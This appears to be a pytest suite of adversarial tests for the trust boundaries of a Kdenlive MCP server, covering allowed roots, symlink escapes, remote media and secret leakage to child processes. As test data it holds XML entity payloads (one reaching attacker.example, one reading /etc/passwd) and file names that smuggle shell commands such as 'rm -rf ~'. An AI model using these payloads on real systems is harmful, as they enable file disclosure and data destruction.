"""Adversarial tests for the local trust boundaries (#27). See docs/security.md."""

from __future__ import annotations

import os
import shutil
from pathlib import Path

import pytest

from mcp_kdenlive import create, kdenlive_doc, media, policy, render, safexml, writer
from mcp_kdenlive.errors import ProjectError

FIX = Path(__file__).parent / "fixtures"


@pytest.fixture
def ws(tmp_path) -> Path:
    shutil.copytree(FIX / "kd26", tmp_path / "allowed" / "proj")
    (tmp_path / "outside").mkdir()
    return tmp_path


@pytest.fixture
def roots(ws, monkeypatch):
    monkeypatch.setenv(policy.ALLOWED_ROOTS_ENV, str(ws / "allowed"))
    return ws


def code_of(fn, *args, **kwargs) -> str:
    with pytest.raises(ProjectError) as err:
        fn(*args, **kwargs)
    return err.value.code


# ------------------------------------------------------------------ allowed roots ------
def _home(tmp_path: Path, user_dirs: str | None = None) -> dict[str, str]:
    home = tmp_path / "home"
    (home / ".config").mkdir(parents=True)
    if user_dirs is not None:
        (home / ".config" / "user-dirs.dirs").write_text(user_dirs, encoding="utf-8")
    return {"HOME": str(home)}


def test_unset_variable_restricts_to_the_videos_directory(tmp_path):
    env = _home(tmp_path, '# comment\nXDG_VIDEOS_DIR="$HOME/Films"\n')
    config = policy.roots_config(env)
    assert config.source == "default"
    assert config.roots == [(tmp_path / "home" / "Films").resolve()]


def test_default_falls_back_to_home_videos(tmp_path):
    assert policy.roots_config(_home(tmp_path)).roots == [(tmp_path / "home" / "Videos").resolve()]
    # xdg-user-dirs marks a disabled directory by pointing it at $HOME itself.
    disabled = _home(tmp_path / "d", 'XDG_VIDEOS_DIR="$HOME/"\n')
    assert policy.roots_config(disabled).roots == [(tmp_path / "d" / "home" / "Videos").resolve()]


def test_default_honours_xdg_config_home_and_absolute_paths(tmp_path):
    env = _home(tmp_path)
    cfg = tmp_path / "cfg"
    cfg.mkdir()
    (cfg / "user-dirs.dirs").write_text(f'XDG_VIDEOS_DIR="{tmp_path / "vids"}"\n')
    env["XDG_CONFIG_HOME"] = str(cfg)
    assert policy.roots_config(env).roots == [(tmp_path / "vids").resolve()]


def test_default_root_is_enforced(tmp_path):
    env = _home(tmp_path)
    videos = tmp_path / "home" / "Videos"
    videos.mkdir()
    shutil.copy(FIX / "kd26" / "kd26-ntsc.kdenlive", videos / "p.kdenlive")
    shutil.copy(FIX / "kd26" / "kd26-ntsc.kdenlive", tmp_path / "elsewhere.kdenlive")
    assert policy.check_allowed(videos / "p.kdenlive", "Reading a project", env)
    with pytest.raises(ProjectError) as err:
        policy.check_allowed(tmp_path / "elsewhere.kdenlive", "Reading a project", env)
    assert err.value.code == "path_not_allowed"
    assert policy.ALLOWED_ROOTS_ENV in err.value.hint
    assert "default" in err.value.hint and "unrestricted" in err.value.hint


def test_missing_default_directory_refuses_everything_without_crashing(tmp_path):
    env = _home(tmp_path)  # no ~/Videos
    with pytest.raises(ProjectError) as err:
        policy.check_allowed(tmp_path / "x.kdenlive", "Reading a project", env)
    assert err.value.code == "path_not_allowed"
    assert "does not exist" in err.value.hint


def test_symlinked_videos_directory(tmp_path):
    env = _home(tmp_path)
    target = tmp_path / "disk" / "videos"
    target.mkdir(parents=True)
    (tmp_path / "home" / "Videos").symlink_to(target)
    (target / "a.mp4").write_bytes(b"x")
    assert policy.check_allowed(tmp_path / "home" / "Videos" / "a.mp4", "Reading media", env)
    assert policy.check_allowed(target / "a.mp4", "Reading media", env)


def test_explicit_opt_out_is_unrestricted(ws, monkeypatch):
    monkeypatch.setenv(policy.ALLOWED_ROOTS_ENV, "unrestricted")
    config = policy.roots_config()
    assert (config.roots, config.source) == (None, "unrestricted")
    shutil.copy(ws / "allowed" / "proj" / "kd26-ntsc.kdenlive", ws / "outside" / "p.kdenlive")
    assert kdenlive_doc.load(str(ws / "outside" / "p.kdenlive")).generation == 5


def test_explicit_list_is_the_environment_source(ws, monkeypatch):
    monkeypatch.setenv(policy.ALLOWED_ROOTS_ENV, f"{ws / 'allowed'}:{ws / 'outside'}")
    config = policy.roots_config()
    assert config.source == "environment"
    assert config.roots == [(ws / "allowed").resolve(), (ws / "outside").resolve()]


def test_projects_outside_roots_are_refused(roots):
    shutil.copy(roots / "allowed" / "proj" / "kd26-ntsc.kdenlive", roots / "outside" / "p.kdenlive")
    assert code_of(kdenlive_doc.load, str(roots / "outside" / "p.kdenlive")) == "path_not_allowed"
    assert kdenlive_doc.load(str(roots / "allowed" / "proj" / "kd26-ntsc.kdenlive"))


def test_traversal_is_resolved_before_checking(roots):
    shutil.copy(roots / "allowed" / "proj" / "kd26-ntsc.kdenlive", roots / "outside" / "p.kdenlive")
    sneaky = roots / "allowed" / "proj" / ".." / ".." / "outside" / "p.kdenlive"
    assert code_of(kdenlive_doc.load, str(sneaky)) == "path_not_allowed"


def test_symlink_escaping_the_root_is_refused(roots):
    shutil.copy(roots / "allowed" / "proj" / "kd26-ntsc.kdenlive", roots / "outside" / "p.kdenlive")
    link = roots / "allowed" / "link.kdenlive"
    link.symlink_to(roots / "outside" / "p.kdenlive")
    assert code_of(kdenlive_doc.load, str(link)) == "path_not_allowed"
    (roots / "outside" / "secret.mp4").write_bytes(b"x")
    (roots / "allowed" / "media-link.mp4").symlink_to(roots / "outside" / "secret.mp4")
    assert (
        code_of(media.inspect_file, str(roots / "allowed" / "media-link.mp4")) == "path_not_allowed"
    )


def test_writes_outside_roots_are_refused(roots):
    edit = writer.open_for_edit(str(roots / "allowed" / "proj" / "kd26-ntsc.kdenlive"))
    assert (
        code_of(writer.save, edit, str(roots / "outside" / "copy.kdenlive")) == "path_not_allowed"
    )
    assert not (roots / "outside" / "copy.kdenlive").exists()


def test_probing_skips_media_outside_roots(roots):
    project = roots / "allowed" / "proj" / "kd26-ntsc.kdenlive"
    text = project.read_text(encoding="utf-8").replace(
        "media/tone.wav", str(roots / "outside" / "tone.wav")
    )
    shutil.copy(roots / "allowed" / "proj" / "media" / "tone.wav", roots / "outside" / "tone.wav")
    project.write_text(text, encoding="utf-8")
    rep = media.media_report(kdenlive_doc.load(str(project)), probe=True)
    outside = next(i for i in rep.items if i.reference == str(roots / "outside" / "tone.wav"))
    assert (
        outside.probe
        and not outside.probe.ok
        and "outside the allowed roots" in outside.probe.error
    )


def test_relative_root_configuration_is_rejected(monkeypatch, ws):
    monkeypatch.setenv(policy.ALLOWED_ROOTS_ENV, "relative/dir")
    assert code_of(kdenlive_doc.load, str(ws / "allowed" / "proj" / "kd26-ntsc.kdenlive")) == (
        "invalid_configuration"
    )


# ------------------------------------------------------------------ write targets ------
def test_symlinked_destination_is_refused(ws):
    target = ws / "outside" / "victim.kdenlive"
    target.write_text("do not touch")
    link = ws / "allowed" / "proj" / "link.kdenlive"
    link.symlink_to(target)
    edit = writer.open_for_edit(str(ws / "allowed" / "proj" / "kd26-ntsc.kdenlive"))
    assert code_of(writer.save, edit, str(link), overwrite=True) == "invalid_output"
    assert target.read_text() == "do not touch"


def test_special_file_destination_is_refused(ws):
    fifo = ws / "allowed" / "proj" / "pipe.kdenlive"
    os.mkfifo(fifo)
    edit = writer.open_for_edit(str(ws / "allowed" / "proj" / "kd26-ntsc.kdenlive"))
    assert code_of(writer.save, edit, str(fifo), overwrite=True) == "invalid_output"


@pytest.mark.parametrize("name", [".bashrc", "evil.sh", "out.kdenlive", "noext"])
def test_render_output_must_be_a_media_file(ws, name):
    project = ws / "allowed" / "proj" / "kd26-ntsc-timeline.kdenlive"
    assert code_of(render._check_output, str(ws / "allowed" / name), project, overwrite=True) == (
        "invalid_output"
    )


def test_create_refuses_symlink_output(stub_melt, ws):
    env, _ = stub_melt
    victim = ws / "outside" / "victim.kdenlive"
    victim.write_text("keep")
    link = ws / "allowed" / "new.kdenlive"
    link.symlink_to(victim)
    assert (
        code_of(
            create.create_project,
            str(link),
            str(ws / "allowed" / "proj" / "media" / "ntsc.mp4"),
            "atsc_720p_2997",
            overwrite=True,
            env=env,
        )
        == "invalid_output"
    )
    assert victim.read_text() == "keep"


# ------------------------------------------------------------------ remote media -------
def test_render_refuses_remote_media(ws, make_stub, stub_env, monkeypatch):
    project = ws / "allowed" / "proj" / "kd26-ntsc-timeline.kdenlive"
    project.write_text(
        project.read_text(encoding="utf-8").replace(
            "media/tone.wav", "https://attacker.example/beacon.wav"
        ),
        encoding="utf-8",
    )
    make_stub("kdenlive", 'if [ "$1" = --help ]; then echo "--render --render-preset"; fi')
    sysdata = ws / "sys" / "kdenlive" / "export"
    sysdata.mkdir(parents=True)
    sysdata.joinpath("profiles.xml").write_text(
        '<profiles><group id="g"><profile name="MP4-H264/AAC" extension="mp4"/></group></profiles>'
    )
    env = dict(stub_env, XDG_DATA_DIRS=str(ws / "sys"), XDG_DATA_HOME=str(ws / "none"))
    assert (
        code_of(render.prepare, str(project), str(ws / "allowed" / "o.mp4"), env=env)
        == "remote_media"
    )


# ------------------------------------------------------------------ XML exhaustion -----
def test_deep_nesting_is_refused(tmp_path):
    deep = "<mlt>" + "<a>" * 1000 + "</a>" * 1000 + "</mlt>"
    bad = tmp_path / "deep.kdenlive"
    bad.write_text(deep)
    assert code_of(kdenlive_doc.load, str(bad)) == "too_large"


def test_element_count_is_bounded(tmp_path, monkeypatch):
    monkeypatch.setattr(safexml, "MAX_ELEMENTS", 1000)
    bad = tmp_path / "wide.kdenlive"
    bad.write_text("<mlt>" + "<a/>" * 2000 + "</mlt>")
    assert code_of(kdenlive_doc.load, str(bad)) == "too_large"


@pytest.mark.parametrize(
    "payload",
    [
        '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY a "aaaaaaaaaa">'
        '<!ENTITY b "&a;&a;&a;&a;">]><mlt>&b;</mlt>',
        '<!DOCTYPE m [<!ENTITY x SYSTEM "http://attacker.example/x">]><mlt>&x;</mlt>',
        '<!DOCTYPE m [<!ENTITY % p SYSTEM "file:///etc/passwd"> %p;]><mlt/>',
    ],
)
def test_entity_attacks(tmp_path, payload):
    bad = tmp_path / "e.kdenlive"
    bad.write_text(payload)
    assert code_of(kdenlive_doc.load, str(bad)) == "unsafe_xml"


# ------------------------------------------------------------------ hostile names ------
@pytest.mark.parametrize(
    "name",
    [
        "-i input.mp4",
        "x;rm -rf ~.mp4",
        "a$(touch pwned).mp4",
        "line\nbreak.mp4",
        "quote'\"`.mp4",
        "-.mp4",
        "=key=value.mp4",
    ],
)
def test_hostile_media_names_are_plain_arguments(stub_melt, ws, name):
    env, args_file = stub_melt
    mdir = ws / "allowed" / "proj" / "media"
    hostile = mdir / name
    shutil.copy(mdir / "ntsc.mp4", hostile)
    out = ws / "allowed" / "proj" / "h.kdenlive"
    create.create_project(str(out), str(hostile), "atsc_720p_2997", env=env)
    args = args_file.read_text().split("\n")
    assert f"avformat:{hostile}".split("\n")[0] in args  # passed verbatim, as one argument
    assert not (Path.cwd() / "pwned").exists() and not (ws / "pwned").exists()
    clip = media.media_report(kdenlive_doc.load(str(out))).items
    assert any(i.reference == f"media/{name}" for i in clip)


# ------------------------------------------------------------------ environment --------
def test_child_environment_is_allow_listed(make_stub, stub_env, tmp_path):
    record = tmp_path / "env.txt"
    make_stub(
        "ffprobe",
        'echo "TOKEN=${SOME_API_TOKEN:+leaked} LANG=$LANG MLT=$MLT_REPOSITORY"'
        f' > "{record}"; echo "{{}}"',
    )
    os.environ["SOME_API_TOKEN"] = "s3cr3t"  # noqa: S105 - fake value, must not reach the child
    os.environ["MLT_REPOSITORY"] = "/opt/mlt"
    os.environ["LANG"] = "fr_FR.UTF-8"
    try:
        media.probe_file(tmp_path / "x.mp4", str(tmp_path / "bin" / "ffprobe"))
    finally:
        del os.environ["SOME_API_TOKEN"], os.environ["MLT_REPOSITORY"]
    assert record.read_text().strip() == "TOKEN= LANG=fr_FR.UTF-8 MLT=/opt/mlt"


def test_child_env_function():
    env = policy.child_env(
        {
            "PATH": "/bin",
            "GITHUB_TOKEN": "x",
            "QT_SCALE": "1",
            "LC_ALL": "C",
            "AWS_SECRET_ACCESS_KEY": "y",
        },
        EXTRA="1",
    )
    assert env == {"PATH": "/bin", "QT_SCALE": "1", "LC_ALL": "C", "EXTRA": "1"}
